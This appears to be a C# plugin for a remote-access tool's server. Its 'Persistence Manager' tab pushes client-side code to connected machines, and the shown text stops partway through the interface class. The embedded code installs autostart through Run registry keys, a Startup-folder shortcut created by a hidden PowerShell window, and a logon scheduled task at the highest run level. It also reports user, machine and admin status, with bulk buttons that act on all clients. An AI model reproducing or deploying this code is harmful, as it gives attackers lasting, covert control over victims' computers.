// File: Plugins/Builtin/PersistencePlugin.cs
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Linq;
using System.Runtime.Versioning;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Threading;
using WpfApp.Plugins;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class PersistencePlugin : IServerPlugin, IMultiClientPlugin
    {
        private PluginHost _host;
        private readonly ConcurrentDictionary<string, PluginContext> _clientContexts = new();
        private PersistenceMultiClientUI _sharedUI;
        private readonly object _uiLock = new();

        public string PluginId => "persistence";
        public string DisplayName => "Persistence Manager";
        public string Version => "1.1.0";
        public string Description => "Manage client startup persistence across all connected clients from a single tab.";

        // Opcodes
        private const byte OP_QUERY_INFO = 0x01;
        private const byte OP_INSTALL_REGISTRY_HKCU = 0x02;
        private const byte OP_INSTALL_REGISTRY_HKLM = 0x03;
        private const byte OP_INSTALL_STARTUP_FOLDER = 0x04;
        private const byte OP_INSTALL_TASK_SCHEDULER = 0x05;
        private const byte OP_REMOVE_REGISTRY_HKCU = 0x10;
        private const byte OP_REMOVE_REGISTRY_HKLM = 0x11;
        private const byte OP_REMOVE_STARTUP_FOLDER = 0x12;
        private const byte OP_REMOVE_TASK_SCHEDULER = 0x13;
        private const byte OP_QUERY_STATUS = 0x20;
        private const byte OP_SET_REGISTRY_NAME = 0x30;

        private const byte CLIENT_READY = 0xFE;
        private const byte CLIENT_ACK = 0x01;
        private const byte CLIENT_ERROR = 0x02;
        private const byte CLIENT_INFO_RESPONSE = 0x03;
        private const byte CLIENT_STATUS_RESPONSE = 0x04;

        public Task Initialize(PluginHost host)
        {
            _host = host;
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            lock (_uiLock)
            {
                _sharedUI?.Dispose();
                _sharedUI = null;
            }
            _clientContexts.Clear();
            return Task.CompletedTask;
        }

        // ==================== IMultiClientPlugin ====================

        public void AddClient(string clientId, PluginContext context)
        {
            _clientContexts[clientId] = context;
            lock (_uiLock)
            {
                _sharedUI?.OnClientAdded(clientId);
            }
        }

        public void RemoveClient(string clientId)
        {
            if (_clientContexts.TryRemove(clientId, out _))
            {
                lock (_uiLock)
                {
                    _sharedUI?.OnClientRemoved(clientId);
                }
            }
        }

        public void RemoveAllClients()
        {
            var ids = _clientContexts.Keys.ToList();
            _clientContexts.Clear();
            lock (_uiLock)
            {
                foreach (var id in ids)
                    _sharedUI?.OnClientRemoved(id);
            }
        }

        public List<string> GetManagedClientIds()
        {
            return _clientContexts.Keys.ToList();
        }

        public UserControl CreateSharedUI()
        {
            lock (_uiLock)
            {
                if (_sharedUI != null)
                    return _sharedUI;

                _sharedUI = new PersistenceMultiClientUI(this);

                // Add any already-connected clients
                foreach (var clientId in _clientContexts.Keys)
                    _sharedUI.OnClientAdded(clientId);

                return _sharedUI;
            }
        }

        // Standard single-client CreateUI � returns existing shared UI or creates it
        public UserControl CreateUI(PluginContext context)
        {
            return CreateSharedUI();
        }

        // ==================== Client Data ====================

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;

            PersistenceMultiClientUI ui;
            lock (_uiLock)
            {
                ui = _sharedUI;
            }

            if (ui == null) return Task.CompletedTask;

            byte indicator = data[0];

            switch (indicator)
            {
                case CLIENT_READY:
                    ui.OnClientReady(clientId);
                    break;
                case CLIENT_ACK:
                    if (data.Length >= 2)
                        ui.OnCommandAck(clientId, data[1]);
                    break;
                case CLIENT_ERROR:
                    if (data.Length >= 2)
                    {
                        string error = data.Length > 2 ? Encoding.UTF8.GetString(data, 2, data.Length - 2) : "Unknown";
                        ui.OnCommandError(clientId, data[1], error);
                    }
                    break;
                case CLIENT_INFO_RESPONSE:
                    if (data.Length > 1)
                    {
                        string info = Encoding.UTF8.GetString(data, 1, data.Length - 1);
                        ui.OnInfoReceived(clientId, info);
                    }
                    break;
                case CLIENT_STATUS_RESPONSE:
                    if (data.Length > 1)
                    {
                        string status = Encoding.UTF8.GetString(data, 1, data.Length - 1);
                        ui.OnStatusReceived(clientId, status);
                    }
                    break;
            }

            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            // Only remove from contexts; the MainWindow also calls RemoveClient via IMultiClientPlugin
            // so we guard against double-removal in RemoveClient with TryRemove
            RemoveClient(clientId);
            return Task.CompletedTask;
        }

        // ==================== Command Senders ====================

        public void SendCommand(string clientId, byte opcode, byte[] payload = null)
        {
            if (!_clientContexts.ContainsKey(clientId))
                return;

            int payloadLen = payload?.Length ?? 0;
            byte[] data = new byte[1 + payloadLen];
            data[0] = opcode;
            if (payload != null && payload.Length > 0)
                Buffer.BlockCopy(payload, 0, data, 1, payload.Length);

            _host.SendPluginDataToClient(clientId, PluginId, data);
        }

        public void SendToAll(byte opcode, byte[] payload = null)
        {
            var clientIds = _clientContexts.Keys.ToList();
            foreach (var clientId in clientIds)
                SendCommand(clientId, opcode, payload);
        }

        public string GetClientCode()
        {
            string runKeyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

            string code = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace ClientPlugin_persistence
{
    public class Main
    {
        private Func<byte[], Task> _send;
        private Func<Task<byte[]>> _receive;
        private string _registryValueName = ""ClientService"";
        private const string RUN_KEY_PATH = @""%%RUNKEYPATH%%"";
        private CancellationTokenSource _cts = new CancellationTokenSource();

        public async Task Run(Func<byte[], Task> send, Func<Task<byte[]>> receive)
        {
            _send = send;
            _receive = receive;

            await _send(new byte[] { 0xFE });

            try
            {
                while (!_cts.IsCancellationRequested)
                {
                    byte[] data = await _receive();
                    if (data == null || data.Length == 0) break;

                    byte opcode = data[0];
                    byte[] payload = null;
                    if (data.Length > 1)
                    {
                        payload = new byte[data.Length - 1];
                        Buffer.BlockCopy(data, 1, payload, 0, payload.Length);
                    }

                    byte[] response = null;

                    try
                    {
                        switch (opcode)
                        {
                            case 0x01:
                                response = BuildInfoResponse();
                                break;
                            case 0x02:
                                InstallRegistryHKCU();
                                response = new byte[] { 0x01, opcode };
                                break;
                            case 0x03:
                                InstallRegistryHKLM();
                                response = new byte[] { 0x01, opcode };
                                break;
                            case 0x04:
                                InstallStartupFolder();
                                response = new byte[] { 0x01, opcode };
                                break;
                            case 0x05:
                                InstallTaskScheduler();
                                response = new byte[] { 0x01, opcode };
                                break;
                            case 0x10:
                                RemoveRegistryHKCU();
                                response = new byte[] { 0x01, opcode };
                                break;
                            case 0x11:
                                RemoveRegistryHKLM();
                                response = new byte[] { 0x01, opcode };
                                break;
                            case 0x12:
                                RemoveStartupFolder();
                                response = new byte[] { 0x01, opcode };
                                break;
                            case 0x13:
                                RemoveTaskScheduler();
                                response = new byte[] { 0x01, opcode };
                                break;
                            case 0x20:
                                response = BuildStatusResponse();
                                break;
                            case 0x30:
                                if (payload != null && payload.Length > 0)
                                {
                                    _registryValueName = Encoding.UTF8.GetString(payload).Trim();
                                    if (string.IsNullOrEmpty(_registryValueName))
                                        _registryValueName = ""ClientService"";
                                }
                                response = new byte[] { 0x01, opcode };
                                break;
                            case 0xFF:
                                _cts.Cancel();
                                break;
                        }
                    }
                    catch (Exception ex)
                    {
                        byte[] errBytes = Encoding.UTF8.GetBytes(ex.Message);
                        response = new byte[2 + errBytes.Length];
                        response[0] = 0x02;
                        response[1] = opcode;
                        Buffer.BlockCopy(errBytes, 0, response, 2, errBytes.Length);
                    }

                    if (response != null)
                    {
                        try { await _send(response); } catch { }
                    }
                }
            }
            catch (OperationCanceledException) { }
        }

        private string GetCurrentExePath()
        {
            return Process.GetCurrentProcess().MainModule.FileName;
        }

        private string GetShortcutName()
        {
            return Path.GetFileNameWithoutExtension(GetCurrentExePath());
        }

        private string GetStartupFolderLnkPath()
        {
            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            return Path.Combine(startupFolder, GetShortcutName() + "".lnk"");
        }

        private string GetTaskName()
        {
            return _registryValueName;
        }

        private byte[] BuildInfoResponse()
        {
            var proc = Process.GetCurrentProcess();
            string exePath = proc.MainModule.FileName;
            string exeDir = Path.GetDirectoryName(exePath);
            string procName = proc.ProcessName;
            int pid = proc.Id;
            string user = Environment.UserName;
            string machine = Environment.MachineName;
            bool isAdmin = false;
            try
            {
                using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
                {
                    var principal = new System.Security.Principal.WindowsPrincipal(identity);
                    isAdmin = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
                }
            }
            catch { }

            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

            var sb = new StringBuilder();
            sb.AppendLine(""ExePath="" + exePath);
            sb.AppendLine(""ExeDir="" + exeDir);
            sb.AppendLine(""ProcessName="" + procName);
            sb.AppendLine(""PID="" + pid);
            sb.AppendLine(""User="" + user);
            sb.AppendLine(""Machine="" + machine);
            sb.AppendLine(""IsAdmin="" + isAdmin);
            sb.AppendLine(""StartupFolder="" + startupFolder);
            sb.AppendLine(""RegistryName="" + _registryValueName);
            sb.AppendLine(""OSVersion="" + Environment.OSVersion);
            sb.AppendLine(""Is64BitOS="" + Environment.Is64BitOperatingSystem);
            sb.AppendLine(""Is64BitProcess="" + Environment.Is64BitProcess);

            byte[] infoBytes = Encoding.UTF8.GetBytes(sb.ToString());
            byte[] result = new byte[1 + infoBytes.Length];
            result[0] = 0x03;
            Buffer.BlockCopy(infoBytes, 0, result, 1, infoBytes.Length);
            return result;
        }

        private byte[] BuildStatusResponse()
        {
            var sb = new StringBuilder();

            bool hkcuInstalled = false;
            string hkcuValue = """";
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(RUN_KEY_PATH, false))
                {
                    if (key != null)
                    {
                        object val = key.GetValue(_registryValueName);
                        if (val != null)
                        {
                            hkcuInstalled = true;
                            hkcuValue = val.ToString();
                        }
                    }
                }
            }
            catch { }

            bool hklmInstalled = false;
            string hklmValue = """";
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(RUN_KEY_PATH, false))
                {
                    if (key != null)
                    {
                        object val = key.GetValue(_registryValueName);
                        if (val != null)
                        {
                            hklmInstalled = true;
                            hklmValue = val.ToString();
                        }
                    }
                }
            }
            catch { }

            bool startupFolderInstalled = File.Exists(GetStartupFolderLnkPath());

            bool taskInstalled = false;
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = ""schtasks.exe"",
                    Arguments = ""/Query /TN "" + Quote(GetTaskName()),
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };
                using (var p = Process.Start(psi))
                {
                    p.WaitForExit(5000);
                    taskInstalled = p.ExitCode == 0;
                }
            }
            catch { }

            sb.AppendLine(""HKCU="" + (hkcuInstalled ? ""YES|"" + hkcuValue : ""NO""));
            sb.AppendLine(""HKLM="" + (hklmInstalled ? ""YES|"" + hklmValue : ""NO""));
            sb.AppendLine(""StartupFolder="" + (startupFolderInstalled ? ""YES|"" + GetStartupFolderLnkPath() : ""NO""));
            sb.AppendLine(""TaskScheduler="" + (taskInstalled ? ""YES|"" + GetTaskName() : ""NO""));

            byte[] statusBytes = Encoding.UTF8.GetBytes(sb.ToString());
            byte[] result = new byte[1 + statusBytes.Length];
            result[0] = 0x04;
            Buffer.BlockCopy(statusBytes, 0, result, 1, statusBytes.Length);
            return result;
        }

        private static string Quote(string s)
        {
            return new string(new char[] { (char)34 }) + s + new string(new char[] { (char)34 });
        }

        private void InstallRegistryHKCU()
        {
            string exePath = GetCurrentExePath();
            using (var key = Registry.CurrentUser.OpenSubKey(RUN_KEY_PATH, true))
            {
                key.SetValue(_registryValueName, Quote(exePath));
            }
        }

        private void InstallRegistryHKLM()
        {
            string exePath = GetCurrentExePath();
            using (var key = Registry.LocalMachine.OpenSubKey(RUN_KEY_PATH, true))
            {
                if (key == null)
                    throw new UnauthorizedAccessException(""Cannot open HKLM Run key. Admin rights required."");
                key.SetValue(_registryValueName, Quote(exePath));
            }
        }

        private void InstallStartupFolder()
        {
            string exePath = GetCurrentExePath();
            string lnkPath = GetStartupFolderLnkPath();
            string exeDir = Path.GetDirectoryName(exePath);

            string ps = string.Format(
                ""$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('{0}'); $s.TargetPath = '{1}'; $s.WorkingDirectory = '{2}'; $s.Save()"",
                lnkPath.Replace(""'"", ""''""),
                exePath.Replace(""'"", ""''""),
                exeDir.Replace(""'"", ""''"")
            );

            var psi = new ProcessStartInfo
            {
                FileName = ""powershell.exe"",
                Arguments = ""-NoProfile -WindowStyle Hidden -Command "" + Quote(ps),
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };
            using (var p = Process.Start(psi))
            {
                p.WaitForExit(15000);
                if (p.ExitCode != 0)
                {
                    string err = p.StandardError.ReadToEnd();
                    throw new Exception(""PowerShell shortcut creation failed: "" + err);
                }
            }

            if (!File.Exists(lnkPath))
                throw new Exception(""Shortcut file was not created."");
        }

        private void InstallTaskScheduler()
        {
            string exePath = GetCurrentExePath();
            string taskName = GetTaskName();

            string args = string.Format(
                ""/Create /TN {0} /TR {1} /SC ONLOGON /RL HIGHEST /F"",
                Quote(taskName), Quote(exePath));

            var psi = new ProcessStartInfo
            {
                FileName = ""schtasks.exe"",
                Arguments = args,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };
            using (var p = Process.Start(psi))
            {
                p.WaitForExit(15000);
                if (p.ExitCode != 0)
                {
                    string err = p.StandardError.ReadToEnd();
                    throw new Exception(""schtasks failed: "" + err);
                }
            }
        }

        private void RemoveRegistryHKCU()
        {
            using (var key = Registry.CurrentUser.OpenSubKey(RUN_KEY_PATH, true))
            {
                if (key != null)
                    key.DeleteValue(_registryValueName, false);
            }
        }

        private void RemoveRegistryHKLM()
        {
            using (var key = Registry.LocalMachine.OpenSubKey(RUN_KEY_PATH, true))
            {
                if (key == null)
                    throw new UnauthorizedAccessException(""Cannot open HKLM Run key. Admin rights required."");
                key.DeleteValue(_registryValueName, false);
            }
        }

        private void RemoveStartupFolder()
        {
            string lnkPath = GetStartupFolderLnkPath();
            if (File.Exists(lnkPath))
                File.Delete(lnkPath);
        }

        private void RemoveTaskScheduler()
        {
            string taskName = GetTaskName();
            var psi = new ProcessStartInfo
            {
                FileName = ""schtasks.exe"",
                Arguments = ""/Delete /TN "" + Quote(taskName) + "" /F"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };
            using (var p = Process.Start(psi))
            {
                p.WaitForExit(15000);
                if (p.ExitCode != 0)
                {
                    string err = p.StandardError.ReadToEnd();
                    throw new Exception(""schtasks delete failed: "" + err);
                }
            }
        }
    }
}
";
            code = code.Replace("%%RUNKEYPATH%%", runKeyPath);
            return code;
        }

        public void Dispose()
        {
            lock (_uiLock)
            {
                _sharedUI?.Dispose();
                _sharedUI = null;
            }
            _clientContexts.Clear();
        }
    }

    // ==================== Client Row Model ====================

    [SupportedOSPlatform("windows")]
    public class PersistenceClientRow : INotifyPropertyChanged
    {
        private string _state = "Waiting...";
        private string _hkcu = "�";
        private string _hklm = "�";
        private string _startupFolder = "�";
        private string _taskScheduler = "�";
        private string _lastResult = "";
        private bool _isSelected;
        private bool _isReady;

        public string ClientId { get; }
        public string ShortId => ClientId.Length > 16 ? ClientId.Substring(0, 16) + "�" : ClientId;

        public string State { get => _state; set { _state = value; Notify(nameof(State)); } }
        public string HKCU { get => _hkcu; set { _hkcu = value; Notify(nameof(HKCU)); } }
        public string HKLM { get => _hklm; set { _hklm = value; Notify(nameof(HKLM)); } }
        public string StartupFolder { get => _startupFolder; set { _startupFolder = value; Notify(nameof(StartupFolder)); } }
        public string TaskScheduler { get => _taskScheduler; set { _taskScheduler = value; Notify(nameof(TaskScheduler)); } }
        public string LastResult { get => _lastResult; set { _lastResult = value; Notify(nameof(LastResult)); } }
        public bool IsSelected { get => _isSelected; set { _isSelected = value; Notify(nameof(IsSelected)); } }
        public bool IsReady { get => _isReady; set { _isReady = value; Notify(nameof(IsReady)); Notify(nameof(State)); } }

        public PersistenceClientRow(string clientId)
        {
            ClientId = clientId;
        }

        public event PropertyChangedEventHandler PropertyChanged;
        private void Notify(string prop) => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(prop));
    }

    // ==================== Multi-Client UI ====================

    [SupportedOSPlatform("windows")]
    public class PersistenceMultiClientUI : UserControl, IDisposable
    {
        private static Color C(string key) => (Color)Application.Current.Resources[key];
        private static SolidColorBrush B(string key) => (SolidColorBrush)Application.Current.Resources[key];

        private Color BgColor => C("BackgroundColor");
        private Color SurfaceColor => C("SurfaceColor");
        private Color BorderColor => C("BorderColor");
        private Color TextColor => C("TextPrimaryColor");
        private Color TextDimColor => C("TextSecondaryColor");
        private Color PrimaryColor => C("PrimaryColor");
        private Color PrimaryHover => C("PrimaryHoverColor");
        private Color DangerColor => C("DangerColor");
        private Color DangerHover => C("DangerHoverColor");
        private Color SuccessColor => C("SuccessColor");
        private Color SuccessHover => C("SuccessHoverColor");
        private Color DisabledBg => C("ButtonBgColor");
        private Color SelectedRowBg => C("BorderColor");
        private Color HoverRowBg => C("SurfaceLightColor");
        private Color ButtonBorderClr => C("ButtonBorderColor");
        private Color ButtonBgClr => C("ButtonBgColor");
        private Color ButtonBgHoverClr => C("ButtonBgHoverColor");

        private readonly PersistencePlugin _plugin;
        private readonly ObservableCollection<PersistenceClientRow> _clients = new();
        private readonly TextBox _logTextBox;
        private readonly ScrollViewer _logScroll;
        private readonly TextBlock _clientCountLabel;
        private readonly TextBox _regNameBox;
        private readonly ListView _clientListView;
        private readonly List<Button> _commandButtons = new();
        private readonly TextBlock _statusText;

        private const int MaxLogLength = 8000;
        private const int LogTrimTarget = 6000;

        public PersistenceMultiClientUI(PersistencePlugin plugin)
        {
            _plugin = plugin;
            Background = new SolidColorBrush(BgColor);

            var mainGrid = new Grid();
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });   // toolbar
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) }); // content
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(140) }); // log
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });   // status bar

            // ===== Toolbar =====
            var toolbar = new Border
            {
                Background = new SolidColorBrush(SurfaceColor),
                BorderBrush = new SolidColorBrush(BorderColor),
                BorderThickness = new Thickness(0, 0, 0, 1),
                Padding = new Thickness(12, 8, 12, 8)
            };

            _clientCountLabel = new TextBlock
            {
                Foreground = new SolidColorBrush(TextDimColor),
                FontSize = 12,
                VerticalAlignment = VerticalAlignment.Center
            };

            var toolbarPanel = new StackPanel { Orientation = Orientation.Horizontal };

            toolbarPanel.Children.Add(_clientCountLabel);

            toolbar.Child = toolbarPanel;
            Grid.SetRow(toolbar, 0);
            mainGrid.Children.Add(toolbar);

            // ===== Content =====
            var contentGrid = new Grid();
            contentGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) }); // client list
            contentGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(320) }); // controls

            // --- Client list with styled ItemContainerStyle ---
            _clientListView = new ListView
            {
                Background = new SolidColorBrush(BgColor),
                BorderThickness = new Thickness(0),
                Foreground = new SolidColorBrush(TextColor),
                ItemsSource = _clients,
                Margin = new Thickness(8)
            };

            // Style the ListViewItem so selection/hover look correct on dark bg
            var itemStyle = new Style(typeof(ListViewItem));
            itemStyle.Setters.Add(new Setter(ListViewItem.BackgroundProperty, Brushes.Transparent));
            itemStyle.Setters.Add(new Setter(ListViewItem.ForegroundProperty, new SolidColorBrush(TextColor)));
            itemStyle.Setters.Add(new Setter(ListViewItem.BorderThicknessProperty, new Thickness(0)));
            itemStyle.Setters.Add(new Setter(ListViewItem.PaddingProperty, new Thickness(4, 2, 4, 2)));

            // Hover trigger
            var hoverTrigger = new Trigger
            {
                Property = UIElement.IsMouseOverProperty,
                Value = true
            };
            hoverTrigger.Setters.Add(new Setter(ListViewItem.BackgroundProperty, new SolidColorBrush(HoverRowBg)));
            itemStyle.Triggers.Add(hoverTrigger);

            // Selected trigger
            var selectedTrigger = new Trigger
            {
                Property = ListViewItem.IsSelectedProperty,
                Value = true
            };
            selectedTrigger.Setters.Add(new Setter(ListViewItem.BackgroundProperty, new SolidColorBrush(SelectedRowBg)));
            selectedTrigger.Setters.Add(new Setter(ListViewItem.ForegroundProperty, new SolidColorBrush(TextColor)));
            itemStyle.Triggers.Add(selectedTrigger);

            _clientListView.ItemContainerStyle = itemStyle;

            var gridView = new GridView();
            gridView.Columns.Add(CreateColumn("", "IsSelected", 30, isCheckBox: true));
            gridView.Columns.Add(CreateColumn("Client", "ShortId", 160));
            gridView.Columns.Add(CreateColumn("State", "State", 90));
            gridView.Columns.Add(CreateColumn("HKCU", "HKCU", 80));
            gridView.Columns.Add(CreateColumn("HKLM", "HKLM", 80));
            gridView.Columns.Add(CreateColumn("Startup", "StartupFolder", 80));
            gridView.Columns.Add(CreateColumn("Task Sched", "TaskScheduler", 80));
            gridView.Columns.Add(CreateColumn("Last Result", "LastResult", 200));

            _clientListView.View = gridView;
            Grid.SetColumn(_clientListView, 0);
            contentGrid.Children.Add(_clientListView);

            // --- Controls panel ---
            var controlsScroll = new ScrollViewer
            {
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                Padding = new Thickness(12, 8, 12, 8)
            };

            var controlsPanel = new StackPanel();

            // Select All / None
            var selectRow = new WrapPanel { Margin = new Thickness(0, 0, 0, 8) };
            var selectAllBtn = MakeThemedButton("Select All", ButtonBgClr, ButtonBgHoverClr);
            selectAllBtn.Click += (s, e) => { foreach (var c in _clients) c.IsSelected = true; };
            selectRow.Children.Add(selectAllBtn);

            var selectNoneBtn = MakeThemedButton("Select None", ButtonBgClr, ButtonBgHoverClr);
            selectNoneBtn.Click += (s, e) => { foreach (var c in _clients) c.IsSelected = false; };
            selectRow.Children.Add(selectNoneBtn);
            controlsPanel.Children.Add(selectRow);

            controlsPanel.Children.Add(MakeSectionSeparator());

            // Query
            controlsPanel.Children.Add(MakeHeader("Query"));
            var queryRow = new WrapPanel { Margin = new Thickness(0, 0, 0, 8) };

            var queryInfoBtn = MakeThemedButton("Query Info", ButtonBgClr, ButtonBgHoverClr);
            queryInfoBtn.Click += (s, e) => SendToSelected(0x01);
            queryRow.Children.Add(queryInfoBtn);
            _commandButtons.Add(queryInfoBtn);

            var queryStatusBtn = MakeThemedButton("Query Status", ButtonBgClr, ButtonBgHoverClr);
            queryStatusBtn.Click += (s, e) => SendToSelected(0x20);
            queryRow.Children.Add(queryStatusBtn);
            _commandButtons.Add(queryStatusBtn);

            var queryAllBtn = MakeThemedButton("Query All", ButtonBgClr, ButtonBgHoverClr);
            queryAllBtn.Click += (s, e) =>
            {
                _plugin.SendToAll(0x20);
                AppendLog("Querying persistence status on all clients...");
            };
            queryRow.Children.Add(queryAllBtn);

            controlsPanel.Children.Add(queryRow);

            controlsPanel.Children.Add(MakeSectionSeparator());

            // Registry Name
            controlsPanel.Children.Add(MakeHeader("Registry Name"));
            var regPanel = new DockPanel { Margin = new Thickness(0, 0, 0, 8) };
            var setNameBtn = MakeThemedButton("Set", ButtonBgClr, ButtonBgHoverClr);
            setNameBtn.Margin = new Thickness(6, 0, 0, 0);
            DockPanel.SetDock(setNameBtn, Dock.Right);
            _commandButtons.Add(setNameBtn);

            _regNameBox = new TextBox
            {
                Text = "ClientService",
                Background = new SolidColorBrush(BgColor),
                Foreground = new SolidColorBrush(TextColor),
                BorderBrush = new SolidColorBrush(BorderColor),
                BorderThickness = new Thickness(1),
                Padding = new Thickness(6, 4, 6, 4),
                CaretBrush = new SolidColorBrush(TextColor),
                FontSize = 12
            };

            setNameBtn.Click += (s, e) =>
            {
                string name = _regNameBox.Text.Trim();
                if (string.IsNullOrEmpty(name)) return;
                SendToSelected(0x30, Encoding.UTF8.GetBytes(name));
                AppendLog($"Setting registry name to '{name}' on selected clients...");
            };

            regPanel.Children.Add(setNameBtn);
            regPanel.Children.Add(_regNameBox);
            controlsPanel.Children.Add(regPanel);

            controlsPanel.Children.Add(MakeSectionSeparator());

            // Install
            controlsPanel.Children.Add(MakeHeader("Install Persistence"));
            var installRow = new WrapPanel { Margin = new Thickness(0, 0, 0, 8) };

            AddCmdBtn(installRow, "HKCU", SuccessColor, SuccessHover, 0x02);
            AddCmdBtn(installRow, "HKLM (Admin)", SuccessColor, SuccessHover, 0x03);
            AddCmdBtn(installRow, "Startup Folder", SuccessColor, SuccessHover, 0x04);
            AddCmdBtn(installRow, "Task Scheduler", SuccessColor, SuccessHover, 0x05);

            controlsPanel.Children.Add(installRow);

            // Remove
            controlsPanel.Children.Add(MakeHeader("Remove Persistence"));
            var removeRow = new WrapPanel { Margin = new Thickness(0, 0, 0, 8) };

            AddCmdBtn(removeRow, "HKCU", DangerColor, DangerHover, 0x10);
            AddCmdBtn(removeRow, "HKLM (Admin)", DangerColor, DangerHover, 0x11);
            AddCmdBtn(removeRow, "Startup Folder", DangerColor, DangerHover, 0x12);
            AddCmdBtn(removeRow, "Task Scheduler", DangerColor, DangerHover, 0x13);

            controlsPanel.Children.Add(removeRow);

            controlsPanel.Children.Add(MakeSectionSeparator());

            // Bulk actions
            controlsPanel.Children.Add(MakeHeader("Bulk Actions"));
            var bulkRow = new WrapPanel { Margin = new Thickness(0, 0, 0, 8) };

            var installAllHkcuBtn = MakeThemedButton("Install HKCU (All)", SuccessColor, SuccessHover);
            installAllHkcuBtn.Click += (s, e) =>
            {
                _plugin.SendToAll(0x02);
                AppendLog("Installing HKCU persistence on ALL clients...");
            };
            bulkRow.Children.Add(installAllHkcuBtn);

            var removeAllBtn = MakeThemedButton("Remove All (All)", DangerColor, DangerHover);
            removeAllBtn.Click += (s, e) =>
            {
                var result = MessageBox.Show("Remove ALL persistence methods from ALL clients?", "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning);
                if (result == MessageBoxResult.Yes)
                {
                    _plugin.SendToAll(0x10);
                    _plugin.SendToAll(0x12);
                    _plugin.SendToAll(0x13);
                    AppendLog("Removing all persistence from ALL clients...");
                }
            };
            bulkRow.Children.Add(removeAllBtn);

            controlsPanel.Children.Add(bulkRow);

            controlsScroll.Content = controlsPanel;

            var controlsBorder = new Border
            {
                BorderBrush = new SolidColorBrush(BorderColor),
                BorderThickness = new Thickness(1, 0, 0, 0),
                Child = controlsScroll
            };
            Grid.SetColumn(controlsBorder, 1);
            contentGrid.Children.Add(controlsBorder);

            Grid.SetRow(contentGrid, 1);
            mainGrid.Children.Add(contentGrid);

            // ===== Log (using TextBox instead of TextBlock for better performance) =====
            var logBorder = new Border
            {
                Background = new SolidColorBrush(SurfaceColor),
                BorderBrush = new SolidColorBrush(BorderColor),
                BorderThickness = new Thickness(0, 1, 0, 0)
            };

            var logGrid = new Grid();
            logGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            logGrid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });

            logGrid.Children.Add(new TextBlock
            {
                Text = "Activity Log",
                FontSize = 11,
                FontWeight = FontWeights.SemiBold,
                Foreground = new SolidColorBrush(TextDimColor),
                Margin = new Thickness(12, 4, 12, 2)
            });

            _logTextBox = new TextBox
            {
                IsReadOnly = true,
                Background = new SolidColorBrush(SurfaceColor),
                Foreground = new SolidColorBrush(TextDimColor),
                BorderThickness = new Thickness(0),
                FontFamily = new FontFamily("Cascadia Mono, Consolas, monospace"),
                FontSize = 11,
                TextWrapping = TextWrapping.Wrap,
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                Padding = new Thickness(12, 0, 12, 6),
                CaretBrush = Brushes.Transparent
            };

            Grid.SetRow(_logTextBox, 1);
            logGrid.Children.Add(_logTextBox);

            logBorder.Child = logGrid;
            Grid.SetRow(logBorder, 2);
            mainGrid.Children.Add(logBorder);

            // ===== Status Bar =====
            var statusBorder = new Border
            {
                Background = new SolidColorBrush(SurfaceColor),
                BorderBrush = new SolidColorBrush(BorderColor),
                BorderThickness = new Thickness(0, 1, 0, 0),
                Padding = new Thickness(12, 5, 12, 5)
            };
            var statusStack = new StackPanel { Orientation = Orientation.Horizontal };
            _statusText = new TextBlock
            {
                Text = "Ready",
                Foreground = new SolidColorBrush(TextDimColor),
                FontSize = 11,
                VerticalAlignment = VerticalAlignment.Center
            };
            statusStack.Children.Add(_statusText);
            statusBorder.Child = statusStack;
            Grid.SetRow(statusBorder, 3);
            mainGrid.Children.Add(statusBorder);

            Content = mainGrid;
            AppendLog("Persistence Manager ready. Select clients and use controls on the right.");
        }

        private void AddCmdBtn(WrapPanel panel, string label, Color bg, Color hover, byte opcode, SolidColorBrush fg = null)
        {
            var btn = MakeThemedButton(label, bg, hover, fg);
            btn.Click += (s, e) => SendToSelected(opcode);
            panel.Children.Add(btn);
            _commandButtons.Add(btn);
        }

        private void SendToSelected(byte opcode, byte[] payload = null)
        {
            var selected = _clients.Where(c => c.IsSelected && c.IsReady).ToList();
            if (selected.Count == 0)
            {
                AppendLog("No ready clients selected.");
                return;
            }

            string opName = GetOpName(opcode);
            foreach (var client in selected)
            {
                _plugin.SendCommand(client.ClientId, opcode, payload);
            }
            AppendLog($"Sent '{opName}' to {selected.Count} client(s).");
        }

